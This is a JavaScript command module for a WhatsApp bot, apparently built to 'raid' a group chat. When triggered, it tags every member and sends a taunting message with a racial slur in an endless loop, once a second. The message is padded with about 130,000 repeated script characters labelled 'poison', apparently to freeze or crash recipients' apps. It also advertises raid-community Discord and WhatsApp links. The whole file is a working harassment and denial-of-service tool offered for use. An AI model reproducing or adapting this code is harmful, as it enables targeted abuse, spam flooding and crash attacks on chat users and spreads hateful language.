global.kudetSpam = global.kudetSpam || {};

module.exports = {
    name: 'kudet',
    alias: ['takeover', 'pengumuman', 'sawit'],
    description: 'kudeta',

    async execute(sock, m, args, { isGroup, isAdmin, isOwner }) {

        if (!isGroup) return;
        if (!isOwner) return;

        if (global.kudetSpam[m.chat]) return;

        const poison = "ꦾ".repeat(65000); 
        const polison = 'ꦽ'.repeat(65000);

        const flexMessage = `[  ⚠️ WARNING ⚠️  ]
*THIS GROUP GET RAIDED LOL !*
*FUCKING  YOU ALL NIGGERS IN THIS GROUP*
*BWAHAHAhahbHAh*
*LINK WEBSITE OFFICIAL* : https://kudeta-kopdar.vercel.app

      _                     _
     / \                  /  \
   /    \________/       \
  |        ________         |
  |       /              \       |
   \__/                  \__/

${poison}
${polison}

*Join Our Community*
*Discord:* https://discord.gg/7PhnNwdnaX
*WhatsApp:* https://chat.whatsapp.com/L0kQgqtQPGk8nxlu4PLj5G
`;

        const textToHide = args.length > 0 ? args.join(' ') : '\u200B'; 

        try {
            const groupMetadata = await sock.groupMetadata(m.chat);
            const participants = groupMetadata.participants.map(p => p.id);

            global.kudetSpam[m.chat] = true;

            m.reply("Laksanakan 😈");

            while (global.kudetSpam[m.chat]) {

                try {
                    await sock.sendMessage(m.chat, { 
                        text: flexMessage, 
                        mentions: participants 
                    });

                    await sock.sendMessage(m.chat, { 
                        text: textToHide, 
                        mentions: participants 
                    });

                } catch (e) {
                    console.error('[ERROR] Gagal mengirim pesan:', e);
                }

                await new Promise(r => setTimeout(r, 1000)); 
            }

        } catch (err) {
            console.error('[HIDETAG ERROR]', err);
            m.reply('❌ Gagal narik data member grup nih wir, coba lagi!');
        }
    }
};